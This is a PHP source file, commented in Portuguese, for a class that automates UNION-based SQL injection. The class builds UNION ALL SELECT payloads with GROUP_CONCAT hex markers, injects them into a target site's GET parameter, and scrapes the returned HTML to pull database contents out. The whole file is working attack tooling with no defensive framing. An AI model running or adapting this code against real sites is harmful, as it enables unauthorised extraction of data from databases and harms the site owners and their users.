<?php
/**
 * Classe especializada em fazer buscar dados de colunas.
 * 
 * @abstract
 * @author José Roniérison <ronierison.silva@gmail.com>
 * @date 15.07.2013
 */
abstract class Olimpo_Zeus_Hades_Odim_Dionisio {
    /**
     * @var String Identificação única do arquivo
     */
    const codeFile = 5;
    /**
     * @const String Marcador do parametro da coluna do UNION dentro do GROUP_CONCAT
     */
    const markerParam = '0x2511,0x50,%column%,0x2511';
    
    /**
     * Estrutura da seleção Union.
     * @var String
     */
    const unionStatmentStructure = '%get_value% UNION ALL SELECT %union_columns%';
    
    /**
     * Estrutura da seleção Union.
     * @var String
     */
    const fromStatmentStructure = ' FROM %table_name% ';
    
    /**
     * Estrutura da seleção Union.
     * @var String
     */
    const whereStatmentStructure = ' WHERE %value1% %IL% %value2% ';
    
    /**
     * @var String Variável substituta do valor $_GET original
     */
    const newGetValue = -1;
    
    /**
     * @const String Formato de saída do marcador no texto HTML
     */
    const markerOutput = 'P%column%%'; //Dois símbolos de porcentagem são propositais
    
    /**
     * @var Procurador
     */
    protected $Procurador;
    
    /**
     * @var Integer Número de colunas SQL para fazer SQL Injection
     */
    protected $_numberofunioncolumns;
    
    /**
     * @var Integer Número da coluna de saída de dado 
     */
    protected $_outputcolumn;
    
    /**
     * @var String último comando executado
     */
    protected $_lastcommand;
    
    /**
     * Constroi estrutura de colunas para Union, inserindo caracteres para 
     * localizar a variável.
     * 
     * @param Array $columns Número de colunas para construir seleção
     * @param String $groupFunction Função de agrupamente utilizado no mysql. Futuramente terá q ser feita uma checagem para uso desta função.
     * @param String $marker Marcador que ajuda a localizar variável solicitada
     * @return String Columns Query
     */
    protected function doColumnsQuery(array $columns, $outputcolumn = null, $groupFunction = 'group_concat(%params%)', $marker = self::markerParam)
    {
        $query = '';
        $marker = trim(trim($marker), ',');
        foreach($columns as $columnNumber => $data){
            if($outputcolumn !== null){
                if($columnNumber != $outputcolumn){
                    $query .= $data.',';                    
                    continue;
                }
            }
            
            $param = str_replace('%column%', $columnNumber, $marker) . ',';
            $param .= $data.',';
            $param .= str_replace('%column%', $columnNumber, $marker);
            
            $query .= str_replace('%params%', $param, $groupFunction) . ',';
        }
        
        return trim(trim($query), ',');
    }
    
    /**
     * Faz requisição e trata dados enviados pelo buscador.
     * 
     * 
     * @param String $outputcolumnQuery Informação que ficará dentro do group_concat
     * @param String $fromTableName Nome da tabela para fazer consulta SQL
     * @param Array  $where ex.: Array('il' => '>', 'value1' => 'tablename.col', 'value2' => 'tablename2.col2')
     * @param String $getValue Valor da varável get de entrada
     * 
     * @return boolean
     * @throws Exception
     */
    public function getDbInfo($outputcolumnQuery, $fromTableName = null, $where = null, $getValue = self::newGetValue)
    {
        if(empty($this->_numberofunioncolumns) || empty($this->_outputcolumn)){
            throw new Exception('Não é possível descobrir a versão do banco de dados sem o número de colunas ou um output para estrutura UNION', self::codeFile.'00001');
            return false;
        }
        
        $this->_lastcommand = null;
        
        $getVarWSI = null;
        $getVarWSI[0][0] = $this->Procurador->getTargetGetVar();
        
        for($count = 1; $count <= $this->_numberofunioncolumns; $count++){
            if($count === $this->_outputcolumn){
                $columns[$count] = $outputcolumnQuery;
            }else{
                $columns[$count] = $count;
            }
        }
        
        $columnsQuery = $this->doColumnsQuery($columns, $this->_outputcolumn);
        
        $completQuery = str_replace('%get_value%', $getValue, str_replace('%union_columns%', $columnsQuery, self::unionStatmentStructure));
        
        if($fromTableName !== null){
            $completQuery .= str_replace('%table_name%', $fromTableName, self::fromStatmentStructure);
        
            if($where !== null){
                $completQuery .= str_replace('%IL%', $where[1],
                                    str_replace('%value2%', $where[2], 
                                        str_replace('%value1%', $where[0], self::whereStatmentStructure)
                                    )
                                  );
            }
        }
        
        $getVarWSI[0][1] = $completQuery;
            
        $this->Procurador->discoverInjectionInfo($getVarWSI);
        $this->_lastcommand = $this->Procurador->getCommand();
        
        $htmltaglines = $this->Procurador->getDataHTMLSQLInjection();
        if($where !== null){
            //Zend_Debug::dump($htmltaglines);
            //Zend_Debug::dump($this->_lastcommand);
        }
        
        if(count($htmltaglines) > 0){
            foreach($htmltaglines as $line){
                for($column = 1; $column <= $this->_numberofunioncolumns; $column++){
                    $marker = str_replace( "%column%", $column, self::markerOutput);
                    $broke = explode($marker, $line);
                    //Zend_Debug::dump($broke);
                    if(count($broke) >= 3){
                        $data = NULL;
                        foreach($broke as $brokedata){
                            $brokedata = trim($brokedata);
                            $dLen = strlen($brokedata);
                            if($dLen > 2 && $brokedata[$dLen-2] === '%' 
                                    && preg_match("/[,]|[<]|[\/]|[>]/i", $brokedata) === 0){
                                $data[] = trim(str_replace('%', '', $brokedata), '');
                            }
                        }
                        if($where !== null){
                            //Zend_Debug::dump($data);
                        }
                        return $data;
                    }
                }
            }
        }
    }
    
    /**
     * Converte de ascii to hex e envia prota para entrada do MySQL. Com "0x".
     * 
     * @param String $string
     * @return String
     */
    static public function ASCIIToHex($string)
    {
        $hex='';
        for ($i=0; $i < strlen($string); $i++){
            $hex .= dechex(ord($string[$i]));
        }

        return '0x'.$hex;
    }
    
    /**
     * @return Integer Número de colunas para estrutura union
     */
    public function getNumberOfColumns()
    {
        return $this->_numberofunioncolumns;
    }
    
    /**
     * @return String retorna ultimo comando executado
     */
    public function getLastCommand()
    {
        return $this->_lastcommand;
    }
    
    /**
     * @return String Coluna escolhiada para pegar dados
     */
    public function getOutPutColumn() 
    {
        return $this->_outputcolumn;
    }
}
?>
